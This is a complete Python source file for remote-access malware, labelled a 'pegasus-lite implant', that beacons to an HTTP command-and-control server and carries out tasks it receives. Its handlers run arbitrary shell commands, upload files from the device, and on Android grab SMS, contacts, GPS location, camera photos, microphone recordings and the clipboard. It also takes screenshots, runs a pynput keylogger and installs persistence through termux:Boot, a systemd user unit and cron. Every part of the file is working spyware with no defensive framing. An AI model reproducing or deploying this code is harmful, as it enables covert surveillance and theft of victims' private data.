#!/usr/bin/env python3
# language: Python 3, file: client/client.py
# pegasus-lite implant — Termux + Linux auto-detection, HTTP C2, task dispatch, exfil.
import os, sys, json, time, uuid, socket, platform, subprocess, shutil, threading, tempfile
from pathlib import Path

try:
    import requests
except ImportError:
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'])
    import requests

C2_URL = os.environ.get('C2_URL', 'http://127.0.0.1:8080').rstrip('/')
STATE_FILE = Path.home() / '.cache' / '.pl_state'
STATE_FILE.parent.mkdir(parents=True, exist_ok=True)

IS_TERMUX = ('com.termux' in os.environ.get('PREFIX', '')
             or os.path.exists('/data/data/com.termux/files/usr'))
TARGET_ID = None
POLL = 5
_keylog_thread = None
_keylog_stop = threading.Event()

def sh(cmd, timeout=60):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout)
        return (r.stdout + r.stderr).decode('utf-8', 'replace')
    except subprocess.TimeoutExpired:
        return "ERR: timeout"
    except Exception as e:
        return f"ERR: {e}"

def sysinfo():
    return {
        "hostname": socket.gethostname(),
        "os": f"{platform.system()} {platform.release()}",
        "user": os.environ.get('USER') or os.environ.get('LOGNAME') or 'unknown',
        "arch": platform.machine(),
        "tags": (["termux", "android"] if IS_TERMUX else ["linux"]),
    }

def load_state():
    global TARGET_ID
    if STATE_FILE.exists():
        try:
            TARGET_ID = json.loads(STATE_FILE.read_text()).get('target_id')
        except Exception:
            pass

def save_state():
    STATE_FILE.write_text(json.dumps({"target_id": TARGET_ID}))

def register():
    global TARGET_ID, POLL
    info = sysinfo()
    info['target_id'] = TARGET_ID
    try:
        r = requests.post(f"{C2_URL}/register", json=info, timeout=15)
        d = r.json()
        TARGET_ID = d['target_id']
        POLL = d.get('poll_interval', 5)
        save_state()
        return True
    except Exception as e:
        print(f"[reg] {e}")
        return False

def upload(task_id, output, filepath=None):
    data = {"target_id": TARGET_ID, "task_id": task_id, "output": output}
    files = None
    if filepath and os.path.exists(filepath):
        files = {"file": (os.path.basename(filepath), open(filepath, 'rb'))}
    try:
        requests.post(f"{C2_URL}/result", data=data, files=files, timeout=120)
    except Exception as e:
        print(f"[up] {e}")
    finally:
        if files:
            files['file'][1].close()

# ---- command handlers ----

def h_sysinfo(args):
    return json.dumps({**sysinfo(), "cwd": os.getcwd(), "pid": os.getpid()}, indent=2), None

def h_shell(args):
    return sh(args.get('raw') or args.get('cmd') or ''), None

def h_ls(args):
    path = args.get('path', '.')
    try:
        entries = []
        for e in os.scandir(path):
            try:
                st = e.stat()
                entries.append(f"{'d' if e.is_dir() else '-'} {st.st_size:>10} {e.name}")
            except Exception:
                entries.append(f"? {e.name}")
        return "\n".join(entries) or "(empty)", None
    except Exception as e:
        return f"ERR: {e}", None

def h_download(args):
    path = args.get('path')
    if not path or not os.path.exists(path):
        return f"ERR: not found: {path}", None
    return f"uploading {path}", path

def h_upload(args):
    return "upload not supported client->server in this direction; use download from server side", None

def h_sms(args):
    if not IS_TERMUX:
        return "ERR: sms only on termux", None
    limit = args.get('limit', 50)
    return sh(f"termux-sms-list -l {limit}"), None

def h_contacts(args):
    if not IS_TERMUX:
        return "ERR: contacts only on termux", None
    return sh("termux-contact-list"), None

def h_location(args):
    if not IS_TERMUX:
        return "ERR: location only on termux", None
    return sh("termux-location -p gps -r once"), None

def h_camera(args):
    if not IS_TERMUX:
        return "ERR: camera only on termux", None
    cam = args.get('camera', 0)
    out = f"/data/data/com.termux/files/home/.cache/pl_cam_{int(time.time())}.jpg"
    sh(f"termux-camera-photo -c {cam} {out}")
    return f"camera {cam}", out if os.path.exists(out) else None

def h_mic(args):
    if not IS_TERMUX:
        return "ERR: mic only on termux", None
    secs = args.get('seconds', 10)
    out = f"/data/data/com.termux/files/home/.cache/pl_mic_{int(time.time())}.m4a"
    sh(f"termux-microphone-record -d {secs} -f {out}", timeout=secs + 10)
    return f"recorded {secs}s", out if os.path.exists(out) else None

def h_clipboard(args):
    if IS_TERMUX:
        return sh("termux-clipboard-get"), None
    if shutil.which('xclip'):
        return sh("xclip -selection clipboard -o"), None
    if shutil.which('wl-paste'):
        return sh("wl-paste"), None
    return "ERR: no clipboard tool", None

def h_screenshot(args):
    out = f"/tmp/pl_scr_{int(time.time())}.png"
    if shutil.which('scrot'):
        sh(f"scrot {out}")
    elif shutil.which('import'):
        sh(f"import -window root {out}")
    elif shutil.which('grim'):
        sh(f"grim {out}")
    else:
        return "ERR: no screenshot tool (scrot/import/grim)", None
    return "screenshot", out if os.path.exists(out) else None

def _keylog_loop(logfile):
    try:
        from pynput import keyboard
    except ImportError:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pynput'])
        from pynput import keyboard
    buf = []
    def on_press(key):
        try:
            buf.append(key.char or '')
        except AttributeError:
            buf.append(f'[{key.name}]')
        if len(buf) >= 32:
            with open(logfile, 'a') as f:
                f.write(''.join(buf))
            buf.clear()
    with keyboard.Listener(on_press=on_press) as l:
        while not _keylog_stop.is_set():
            time.sleep(0.5)
        l.stop()

def h_keylog_start(args):
    global _keylog_thread
    if IS_TERMUX:
        return "ERR: keylog needs Linux + X", None
    if _keylog_thread and _keylog_thread.is_alive():
        return "already running", None
    _keylog_stop.clear()
    logfile = args.get('out', os.path.expanduser('~/.cache/.pl_keys.log'))
    _keylog_thread = threading.Thread(target=_keylog_loop, args=(logfile,), daemon=True)
    _keylog_thread.start()
    return f"keylog started -> {logfile}", None

def h_keylog_stop(args):
    _keylog_stop.set()
    logfile = os.path.expanduser('~/.cache/.pl_keys.log')
    return "stopped", logfile if os.path.exists(logfile) else None

def h_persist(args):
    if IS_TERMUX:
        boot = Path.home() / '.termux' / 'boot'
        boot.mkdir(parents=True, exist_ok=True)
        script = boot / 'start-pl.sh'
        script.write_text(f"#!/data/data/com.termux/files/usr/bin/sh\n"
                          f"nohup env C2_URL={C2_URL} python {os.path.abspath(__file__)} "
                          f">/dev/null 2>&1 &\n")
        script.chmod(0o755)
        return f"termux:Boot entry installed: {script}", None
    # Linux: systemd user unit + fallback cron
    unit_dir = Path.home() / '.config' / 'systemd' / 'user'
    unit_dir.mkdir(parents=True, exist_ok=True)
    unit = unit_dir / 'pl.service'
    unit.write_text(f"""[Unit]
Description=pl
After=network.target

[Service]
ExecStart={sys.executable} {os.path.abspath(__file__)}
Environment=C2_URL={C2_URL}
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
""")
    sh("systemctl --user daemon-reload")
    sh("systemctl --user enable --now pl.service")
    cron = sh("crontab -l 2>/dev/null")
    if 'pl_keepalive' not in cron:
        line = f"@reboot C2_URL={C2_URL} nohup {sys.executable} {os.path.abspath(__file__)} >/dev/null 2>&1 & # pl_keepalive"
        sh(f'(crontab -l 2>/dev/null; echo "{line}") | crontab -')
    return "persist: systemd user unit + cron @reboot", None

def h_sleep(args):
    secs = args.get('seconds', 60)
    return f"sleeping {secs}", None

HANDLERS = {
    "sysinfo": h_sysinfo, "shell": h_shell, "ls": h_ls,
    "download": h_download, "upload": h_upload,
    "sms": h_sms, "contacts": h_contacts, "location": h_location,
    "camera": h_camera, "mic": h_mic, "clipboard": h_clipboard,
    "screenshot": h_screenshot,
    "keylog_start": h_keylog_start, "keylog_stop": h_keylog_stop,
    "persist": h_persist, "sleep": h_sleep,
}

def dispatch(task):
    cmd = task.get('cmd')
    args = task.get('args') or {}
    fn = HANDLERS.get(cmd)
    if not fn:
        return f"ERR: unknown cmd {cmd}", None
    try:
        return fn(args)
    except Exception as e:
        return f"ERR: {e}", None

def beacon_loop():
    global POLL
    if not TARGET_ID and not register():
        time.sleep(10)
        return
    try:
        r = requests.get(f"{C2_URL}/task/{TARGET_ID}", timeout=15)
        task = r.json().get('task')
    except Exception:
        return
    if not task:
        return
    output, filepath = dispatch(task)
    upload(task['id'], output, filepath)
    if task.get('cmd') == 'sleep':
        time.sleep(task.get('args', {}).get('seconds', 60))

def main():
    load_state()
    if not TARGET_ID:
        while not register():
            time.sleep(5)
    print(f"[pl] target_id={TARGET_ID} c2={C2_URL} termux={IS_TERMUX}")
    while True:
        try:
            beacon_loop()
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"[loop] {e}")
        time.sleep(POLL)

if __name__ == '__main__':
    main()
